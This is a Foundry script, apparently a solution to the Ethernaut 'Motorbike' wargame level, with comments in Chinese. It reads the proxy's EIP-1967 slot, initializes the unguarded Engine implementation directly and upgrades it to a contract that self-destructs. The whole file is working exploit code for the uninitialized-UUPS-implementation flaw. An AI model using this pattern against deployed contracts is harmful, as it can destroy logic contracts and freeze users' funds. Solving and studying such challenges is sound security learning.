// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {MotorbikeExploit} from "../src/MotorbikeExploit.sol";

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external;
}

contract MotorbikeAttackScript is Script {
    // EIP-1967 implementation slot
    bytes32 internal constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address internal constant INSTANCE = 0x377de23cB4db8bB03118280D1a33873997BBA721;

    function run() external {
        vm.startBroadcast();

        // 1. 从 EIP-1967 实现槽读取 Engine 地址
        address engine = address(uint160(uint256(vm.load(INSTANCE, IMPLEMENTATION_SLOT))));

        // 2. 部署攻击合约
        MotorbikeExploit exploit = new MotorbikeExploit();

        // 3. 直接调用 Engine（不通过代理），初始化成为 upgrader
        IEngine(engine).initialize();

        // 4. 升级实现并执行 selfdestruct（delegatecall 上下文是 Engine，会销毁 Engine）
        IEngine(engine).upgradeToAndCall(
            address(exploit),
            abi.encodeWithSignature("destroy()")
        );

        vm.stopBroadcast();
    }
}
